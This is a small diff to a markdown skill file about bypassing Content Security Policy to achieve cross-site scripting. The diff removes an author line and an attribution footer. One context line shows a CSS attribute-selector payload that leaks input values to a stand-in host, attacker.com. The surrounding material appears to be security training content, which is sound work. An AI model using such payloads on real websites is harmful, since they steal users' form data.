@@ -1,5 +1,4 @@
 ---
-author: mahipal
 category: cybersecurity
 description: Analyze and bypass Content Security Policy implementations to achieve
   cross-site scripting by exploiting misconfigurations, JSONP endpoints, unsafe directives,
@@ -248,8 +247,4 @@ input[value^="b"] { background: url("https://attacker.com/?char=b"); }
 - Implement strict-dynamic for modern CSP3 browsers
 ```
 
-
----
-
-*Adapted for Hermes Agent from Anthropic Cybersecurity Skills ([mukul975/Anthropic-Cybersecurity-Skills](https://github.com/mukul975/Anthropic-Cybersecurity-Skills)).*
 
